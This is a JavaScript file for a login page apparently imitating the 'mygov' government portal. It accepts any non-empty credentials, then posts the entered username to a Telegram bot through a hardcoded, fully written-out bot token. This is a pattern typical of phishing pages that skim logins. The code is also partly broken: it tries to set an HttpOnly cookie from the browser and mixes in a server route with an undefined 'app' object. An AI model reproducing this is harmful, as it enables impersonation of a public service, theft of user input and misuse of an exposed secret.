// Function to set a cookie with a specified expiration in hours
function setCookie(cname, cvalue, exhours) { 
    const d = new Date();
    d.setTime(d.getTime() + (exhours * 60 * 60 * 1000)); // Set expiration to exhours
    const expires = "expires=" + d.toUTCString();
    document.cookie = `${cname}=${cvalue};${expires};path=/;Secure;HttpOnly;SameSite=Strict`;
}

// Function to validate the login form
function validateForm() {
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    // Example regex for simple validation
    const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/; // Alphanumeric usernames between 3-20 characters
    const passwordRegex = /.{6,}/; // Password must be at least 6 characters

    if (!usernameRegex.test(username)) {
        alert("Username must be 3-20 characters long and can only contain letters, numbers, and underscores.");
        return false;
    }
    if (!passwordRegex.test(password)) {
        alert("Password must be at least 6 characters long.");
        return false;
    }
    return true;
}

// Function to handle login
function login() { 
    let username = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    if (username !== "" && password !== "") {
        setCookie("username", username, 1); // Set to expire in 1 hour
        alert("Login Successful! Cookies are set.");

        // Notify the Telegram bot
        const telegramAPIUrl = `https://api.telegram.org/bot7767393746:AAHnc1t_WVBTXxuvQsv8ehNSWef7SG8pg0I/sendMessage`;
        const message = `User logged in: ${username}`;

        fetch(telegramAPIUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: '@Annonymousespirit_Bot', // Replace with your actual chat ID or bot username
                text: message
            }),
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => console.log('Telegram notification sent:', data))
        .catch(error => console.error('Error sending Telegram notification:', error));
    } else {
        alert("Please enter both username and password.");
    }
}

// Frontend form submission handling
document.getElementById("mygov-login-form").onsubmit = function(event) {
    event.preventDefault(); // Prevent the default form submission
    if (validateForm()) {
        login(); // Call the login function if the form is valid
    }
};

// Server-side endpoint for notifying Telegram (assuming this part runs in a Node.js environment)
app.post('/notify-telegram', (req, res) => {
    const { username } = req.body;

    // Validate username
    if (!username) {
        return res.status(400).json({ error: 'Username is required' });
    }

    // Logic to send notification to Telegram (assumed function)
    res.json({ success: true });
});
